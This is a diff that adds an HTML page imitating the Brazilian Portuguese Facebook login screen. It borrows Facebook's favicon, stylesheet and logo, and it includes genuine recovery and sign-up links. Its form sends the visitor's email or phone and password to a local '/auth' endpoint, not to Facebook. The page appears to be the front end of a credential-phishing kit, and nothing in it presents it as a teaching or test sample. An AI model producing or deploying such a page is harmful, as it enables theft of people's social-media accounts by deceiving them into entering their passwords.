@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yA/l/0,cross/4s0WXqNJBpb.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="8iPoC" crossorigin="anonymous">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar no Facebook</title>
+    <style>
+        body, html {
+
+background-color: white;
+flex-direction: column;
+display: flex;
+text-align: center;
+justify-content: center;
+align-items: center;
+font-family: Arial, Helvetica, sans-serif;
+}
+.logo {
+
+height: 6rem;
+}
+
+.border {
+
+text-align: center;
+display: flex;
+flex-direction: column;
+border-color: transparent;
+box-shadow: 1px 1px 3px 1px #7d8080;
+border-radius: 6px;
+opacity: 98%;
+border: #b7babec2 1px solid;
+color: #f0f2f53a;
+height: 22rem;
+width: 26rem;
+align-items: center;
+justify-content: center;
+}
+/* Inputs */
+.email  {
+margin-top: 2.2rem;
+height: 3.2rem;
+width: 24rem;
+border: 1px #b7babe solid;
+border-radius: 9px;
+color: black;
+font-size: medium;
+text-align: left;
+
+
+
+} .senha {
+font-size: medium;
+text-align: left;
+margin-top: 1rem;
+height: 3.2rem;
+width: 24rem;
+border: 1px #b7babe solid;
+border-radius: 9px;
+color: rgba(0, 0, 0, 0.788);
+
+} .sub {
+font-size: large;
+color: white;
+border: 1px solid #3d85f2;
+background-color: #2b7de9;
+border-radius: 12px;
+margin-top: 2rem;
+width: 24rem;
+height: 4rem;
+margin-bottom: 1rem;
+}
+    </style>
+</head>
+<body>
+    <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="logo">
+    <fieldset class="border">
+        <h1>Entrar com Facebook</h1>
+        <form action="/auth" method="post">
+            <input type="text" name="user" placeholder="Email ou Telefone" class="email" required>
+            <input type="password" name="pwd" class="senha" placeholder="Senha">
+            <input type="submit" class="sub" value="Entrar">
+            <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login">Esqueceu a Conta ? -</a><a href="https://pt-br.facebook.com/r.php?locale=pt_BR&display=page"> Cadastre-se no Facebook</a>
+        </fieldset>
+    </form>
+</body>
+</html>
